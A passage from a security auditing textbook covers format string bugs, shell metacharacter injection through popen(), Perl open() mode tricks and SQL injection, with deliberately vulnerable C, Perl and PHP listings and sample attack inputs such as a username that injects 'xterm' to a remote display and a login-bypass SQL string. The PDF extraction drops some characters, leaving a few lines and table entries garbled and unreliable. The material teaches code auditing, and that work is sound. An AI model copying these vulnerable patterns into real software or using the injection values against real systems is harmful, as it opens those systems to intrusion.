The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
441 
void vreply(long flags, int n, char *fmt, va_list ap) 
{ 
    char buf[BUFSIZ]; 
    flags &= USE_REPLY_NOTFMT | USE_REPLY_LONG; 
    if (n)   /* if numeric is 0, don't output one; 
                use n==0 in place of printfs */ 
    sprintf(buf, "%03d%c", n, 
            flags & USE_REPLY_LONG ? '-' : ' '); 
    /* This is somewhat of a kludge for autospout. I think 
     * that autospout should be done differently, but 
     * that's not my department. -Kev 
     */ 
    if (flags & USE_REPLY_NOTFMT) 
    snprintf(buf + (n ? 4 : 0), 
             n ? sizeof(buf) - 4 : sizeof(buf), "%s", fmt); 
    else 
    vsnprintf(buf + (n ? 4 : 0), 
              n ? sizeof(buf) - 4 : sizeof(buf), fmt, ap); 
    ... 
} 
As you can see, the second argument to lreply() is a format string passed directly to 
vreply(); the vreply() function then passes the string as the format specifier to 
vsnprintf(). This example shows how format string vulnerabilities typically occur. 
They are most likely to happen when a function takes a variable number of arguments 
and passes that data to an API function for formatting. This type of code occurs most 
often for logging routines, as shown in Listing 8-17. 
Listing 8-17. Format String Vulnerability in a Logging Routine 
int log_error(char *fmt, ...) 
{ 
   char buf[BUFSIZ]; 
   va_list ap; 
   va_start(ap, fmt); 
   vsnprintf(buf, sizeof(buf), fmt, ap); 
   va_end(ap); 
   syslog(LOG_NOTICE, buf); 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
442 
} 
Listing 8-17 shows a logging routine that format data and pass the result to syslog(). 
However, syslog() also performs formatting; so this code is vulnerable to a format 
string attack. 
Auditing Tip 
When attempting to locate format string vulnerabilities, search for all instances of 
printf(), err(), or syslog() functions that accept a nonstatic format string argument, 
and then trace the format argument backward to see whether any part can be 
controlled by attackers. 
If functions in the application take variable arguments and pass them unchecked to 
printf(), syslog(), or err() functions, search every instance of their use for nonstatic 
format string arguments in the same way you would search for printf() and so forth. 
Because locating format strings is a straightforward process, creating programs that 
can analyze code (both source and binary) and locate these vulnerabilities 
automatically isn't too difficult. Many static analysis tools have this capability, 
including those discussed in Chapter 2(? [????.]). Making use of these tools could be 
a helpful when verifying whether code is safe from format string attacks. 
Shell Metacharacters 
Often an application calls an external program to perform a task the external program 
specializes in, as in the following examples: 
A CGI script launches a mail program to send collected form data. 
Changing account information on a system might involve launching an editor 
(chpass, for example). 
Scheduled execution daemons (cron and at) call programs scheduled to run as 
well as a mail program to send results (in some cases). 
Server-side Web applications might call external programs to do some sort of 
back-end processing. 
These examples are only a few possibilities. External application execution happens 
often and can be prone to security problems. Programs are typically launched in two 
ways: running the program directly using a function such as execve() or 
CreateProcess(), or running it via the command shell with functions such as system() 
or popen(). Launching a process via the exec() system call replaces the currently 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
443 
running process with the new one or perhaps spawns a new process instance (as with 
CreateProcess()), like so. 
char *progname = "/usr/bin/sendmail"; 
char *args[] = { "-s", "hi", "PI:EMAIL" }; 
execve(progname, args, envp); 
In this instance, an application attempts to send an e-mail; however, after calling 
execve(), the current application is replaced with the sendmail process. This prevents 
the original process from writing the e-mail data. To accomplish this, the programmer 
must fork a new process and set up pipe descriptors. As another option, the program 
can just run sendmail via the shell popen() interface. The second option does all the 
pipe setup and handling internally and is much easier to code. Listing 8-18 shows an 
example. 
Listing 8-18. Shell Metacharacter Injection Vulnerability 
int send_mail(char *user) 
{ 
    char buf[1024]; 
    FILE *fp; 
    snprintf(buf, sizeof(buf), 
             "/usr/bin/sendmail s \"hi\" %s", user); 
    fp = popen(buf, "w"); 
    if(fp == NULL) 
        return 1; 
    ... write mail ... 
} 
When opening commands with this method, any input is subject to interpretation by 
the shell, so there can be undesirable consequences if certain characters appear in 
the input stream. To understand these consequences better, return to the following 
line from Listing 8-18: 
snprintf(buf, sizeof(buf), 
          "/usr/bin/sendmail s \"hi\" %s", user); 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
444 
When popen() runs this command, it actually constructs the following command line 
(assuming the supplied e-mail address is PI:EMAIL): 
/bin/sh c "/usr/bin/sendmail s "hi" PI:EMAIL" 
The program is being run via the command shell (sh), and any shell metacharacters 
just as if they were typed at the command line or in shell scripts. Returning to the 
previous example, what if the username is given as "PI:EMAIL; xterm -- display 
1.2.3.4:0"? The command line that popen() constructs now looks like this: 
/bin/sh c "/usr/bin/sendmail s "hi" PI:EMAIL; xterm display 1.2.3.4:0" 
The semicolon (;) is interpreted as a command separator, so supplying this username 
doesn't just open sendmail as intended; it also sends an xterm to a remote host! 
Parsing shell metacharacters when using popen() and similar calls poses an imminent 
threat to an application when untrusted data is used to build the command line. When 
auditing applications that use shell capabilities, you need to determine whether 
arbitrary commands could be run via metacharacter injection. Because the shell has 
extensive scripting capabilities, quite a number of characters can be useful to 
attackers. The following list shows the usual suspects: 
Dangerous Shell Characters 
; (separator) 
| (pipe) 
& (background) 
 (redirect) 
` (evaluate) 
! (not operator) 
- (argument switch) 
* (wildcard) 
/ (slash) 
? (question) 
( (open parenthesis) 
) (close parenthesis) 
. (wildcard) 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
445 
; (separator) 
" " (space) 
[ (open bracket) 
] (close bracket) 
"\t" (tab) 
^ (caret) 
~ (homedir) 
\ (escape) 
"\\" (backslash) 
' (quote) 
" (double quote) 
"\r" (carriage return) 
"\n" (newline) 
$ (variable) 
Different shells interpret data differently, so this list isn't complete, but it covers the 
most common characters. Of course, not all these characters are dangerous in all 
situations. 
You also need to pay close attention to the application being launched. Some 
applications are inherently dangerous, depending on their function and how they are 
implemented. Often, you have restrictions on supplying data to these applications; 
however, the application that's being launched potentially represents a new point of 
exposure for the caller. (Remember: A chain is only as strong as its weakest link.) 
Additionally, the called application might have in-band control processing of its own. 
One notable example is the mail program, as shown in Listing 8-19. 
Listing 8-19. An Example of Dangerous Program Use 
int send_mail(char *name, char *email, char *address) 
{ 
    char buf[1024]; 
    FILE *fp; 
    snprintf(buf, sizeof(buf), "/usr/bin/mail %s", email); 
    fp = poen(buf, "w"); 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
446 
    if(fp == NULL) 
        return 1; 
    fprintf(fp, "Subject: web form\n\n"); 
    fprintf(fp, "full name: %s\n", name); 
    fprintf(fp, "address: %s\n", address); 
    ... 
} 
For this example, assume the e-mail address has been adequately filtered. So is this 
program safe? No! The mail program interprets lines beginning with a tilde (~) as a 
command to run, so if you specify the name or address with a value of "\n~xterm 
display 1.2.3.4:0", the mail program spawns an xterm. 
Obviously, maintaining a detailed knowledge of the inner workings of all programs on 
a platformor even all applications your team has writtencan be quite a challenge. 
Despite this difficulty, when developers decide to call another application, they are 
crossing a trust boundary and passing control entirely outside the bounds of their 
applications. Passing control in this way introduces the possibility that the called 
program could undermine all the calling application's security restrictions. For this 
reason, it's well worth your time to examine programs instantiated by the application 
you're auditing, especially if any untrusted input is passed to those programs. 
Finally, be mindful of the fact that input doesn't need to be supplied to an external 
program directly to create vulnerabilities. Attackers might be able to adversely affect 
an application in a number of other ways, depending on how the program is called and 
the environment in which it runs. These details tend to be OS specific, however, so 
they're covered in more depth in Chapters 9(? [????.]) through 12(? [????.]). 
Perl open() 
The multipurpose capabilities of the Perl open() function are worth noting. This 
function can open both files and processes, so it does the job of the open() and popen() 
functions in C. The open() function can be called with three arguments (file handle, 
mode, and filename) or two arguments (file handle and filename). The second 
method determines in which mode to open the file by interpreting metacharacters 
that might be at the beginning or end of the filename. These mode characters, listed 
in Table 8-1, can also direct that the call to the open() function should run the data as 
a command instead of opening a file. 
Table 8-1. Mode Character Interpretation in Perl's open() Function 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
447 
Byte 
Sequence 
Location Meaning 
Beginning Open file for write access; create file if it doesn't exist. 
+ 
Beginning Open file for read-write access; create file if it doesn't 
exist; otherwise, truncate the file. 
>> 
Beginning Open file for write access but don't truncate; append to 
the end of the file. 
+>> 
Beginning Open file for read-write access but don't truncate; append 
to the end of the file. 
| 
Beginning This argument is a command, not a filename. Create a 
pipe to run this command with write access. 
| 
End 
This argument is a command, not a filename. Create a 
pipe to run this command with read access. 
When no mode characters are specified, the file is opened for just read access, just as 
if the file argument contains a leading  mode opens a file for read-write access and truncates 
the file to 0 bytes. This mode is somewhat unique because the file can be modified. 
Say untrusted data is supplied as the username variable in the following call: 
open(FH, "+>$username.txt"); 
If the username variable begins with a >, the file is opened in append mode and isn't 
truncated. Depending on the application's specifics, this result might have interesting 
implications, such as reading data created by a previous user session. 
Apart from this special case, if a mode is specified for opening the file, the call is safe, 
right? No, there's more! The open() function in Perl also duplicates file descriptors for 
you. If the mode argument is followed by an ampersand (&) and the name of a known 
file handle (STDIN, STDOUT, STDERR), open() duplicates the file descriptor with a 
matching mode (such as a leading . Take a look at this 
example: 
open(ADMIN, "+>>/data/admin/admin.conf"); 
... 
open(USER, ">$userprofile"); 
This code fragment assumes that the ADMIN file hasn't been closed when the second 
call to open() is made. It enables attackers to write to the /data/admin/admin.conf file. 
They simply need to know the correct file descriptor number and supply it as the 
userprofile value, such as &= if admin.conf is opened as file descriptor 3. Note that 
the open() call might be exploitable in the following example too: 
open(ADMIN, "+>>/data/admin/admin.conf"); 
... 
open(USER, ">$userprofile.txt"); 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
449 
If attackers can insert NUL bytes, they can supply the userprofile value &=, and the 
file descriptor is duplicated correctly. However, the three-argument version of open() 
would render this code no longer vulnerable because it requires explicitly setting the 
mode in the second parameter. So you can consider three-argument calls to open() to 
be secure, for the most part. 
Auditing Tip 
You might find a vulnerability in which you can duplicate a file descriptor. If you have 
access to an environment similar to one in which the script is running, use lsof or a 
similar tool to determine what file descriptors are open when the process runs. This 
tool should help you see what you might have access to. 
SQL Queries 
SQL is a standard language for interacting with a relational database management 
system (RDBMS). You most likely encounter SQL in the context of Web applications, 
when examining server-side scripts or applications that process input from browsers 
and issue queries to a back-end database. Incorrect handling of input to these queries 
can result in severe vulnerabilities. This discussion focuses on dynamically 
constructed queries in normal SQL syntax. Chapter 17(? [????.]), "Web Applications," 
expands this coverage to address parameterized queries and stored procedures. 
The most common SQL-related vulnerability is SQL injection. It occurs when input is 
taken from request data (post variables, forms, or cookies) and concatenated into a 
query string issued against the database. Listing 8-20 is a simple example in PHP and 
MySQL. 
Listing 8-20. SQL Injection Vulnerability 
$username = $HTTP_POST_VARS['username']; 
$password = $HTTP_POST_VARS['passwd']; 
$query = "SELECT * FROM logintable WHERE user = '" 
    . $username . "' AND pass = '" . $password. "'"; 
... 
$result = mysql_query($query); 
The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities 
450 
if(!$result) 
    die_bad_login(); 
... 
This query is vulnerable to SQL injection because users can supply unfiltered input for 
the passwd and username variables. Attackers could easily submit a string such as 
"bob' OR pass <> 'bob" for both parameters, which results in the following query being 
issued against the database: 
SELECT * from logintable WHERE user = 'bob' 
    OR user <> 'bob' AND pass = 'bob' OR pass <> 'bob' 
In this example, attackers take advantage of the script not filtering the single-quote 